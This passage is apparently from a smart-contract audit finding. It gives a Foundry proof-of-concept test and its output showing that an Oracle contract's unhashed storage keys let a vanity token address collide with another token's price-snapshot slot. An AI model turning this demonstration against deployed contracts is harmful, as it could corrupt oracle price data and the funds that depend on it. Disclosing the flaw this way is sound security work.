n   function sload(bytes32, bytes32, bytes32) external view returns (bytes32, bytes32, bytes32) { return (bytes32(0), bytes32(0), bytes32(0)); }\n\n   // IFlashAccountant minimal stubs\n   function lock() external {}\n   function forward(address) external {}\n   function startPayments() external {}\n   function completePayments() external {}\n   function withdraw() external {}\n   function updateDebt() external {}\n   receive() external payable {}\n\n   // IExposedStorage minimal stubs\n   function sload() external view {}\n   function tload() external view {}\n}\n\n// 2. Harness to expose storage keys\ncontract OracleHarness is Oracle {\n   constructor(ICore core) Oracle(core) {}\n\n   // Expose the raw assembly key generation logic from Oracle.sol\n   function getCountsKey(address token) public pure returns (bytes32 key) {\n       assembly {\n           key := token\n       }\n   }\n\n   function getSnapshotKey(address token, uint32 index) public pure returns (bytes32 key) {\n       assembly {\n           key := or(shl(32, token), index)\n       }\n   }\n}\n\n// 3. The Collision Test\ncontract OracleCollisionTest is Test {\n   OracleHarness oracle;\n   MockCore core;\n\n   function setUp() public {\n       core = new MockCore();\n       oracle = new OracleHarness(core);\n   }\n\n   function test_Storage_Collision() public {\n       // STEP 1: Generate a \"Vanity Address\" with 4 leading zero bytes.\n       // In a real attack, this costs ~2^32 compute (trivial).\n       // Here we simulate it.\n       // TokenA = 0x00000000_00000000000000000000000000000001\n       address tokenA = address(1);\n      \n       // STEP 2: Calculate the Victim Address (TokenB)\n       // TokenB = TokenA << 32\n       // Since TokenA is small, shifting it left by 32 bits fits perfectly in address space.\n       address tokenB = address(uint160(tokenA) << 32);\n\n       // STEP 3: Verify the Keys Collide\n       bytes32 countsKeyB = oracle.getCountsKey(tokenB);\n       bytes32 snapshotKeyA = oracle.getSnapshotKey(tokenA, 0); // Index 0\n\n       console.log(\"Token A:      \", tokenA);\n       console.log(\"Token B:      \", tokenB);\n       console.log(\"Counts Key B: \");\n       console.logBytes32(countsKeyB);\n       console.log(\"Snap Key A:   \");\n       console.logBytes32(snapshotKeyA);\n\n       // VERDICT\n       assertEq(countsKeyB, snapshotKeyA, \"CRITICAL: Storage Collision Detected!\");\n   }\n}\n```\n\n### Output\n```\nRan 1 test for test/extensions/OracleCollision.t.sol:OracleCollisionTest\n[PASS] test_Storage_Collision() (gas: 15009)\nLogs:\n  Token A:       0x0000000000000000000000000000000000000001\n  Token B:       0x0000000000000000000000000000000100000000\n  Counts Key B: \n  0x0000000000000000000000000000000000000000000000000000000100000000\n  Snap Key A:   \n  0x0000000000000000000000000000000000000000000000000000000100000000\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 443.08µs (142.00µs CPU time)\n```\n\n### What This Proves\n\n1. **Deterministic Collision:** The storage key for TokenB's `Counts` is identical to TokenA's `Snapshot` at index 0.\n2. **Trivial Attack Cost:** Generating a token address with leading zeros requires only ~2^32 compute attempts, which is feasible with modern hardware.\n3. **Data Corruption:** Any write to TokenB's metadata will overwrite TokenA's price history, and vice versa.\n4. **No Cryptographic Protection:** The lack of `keccak256` hashing makes the storage layout predictable and exploitable.",
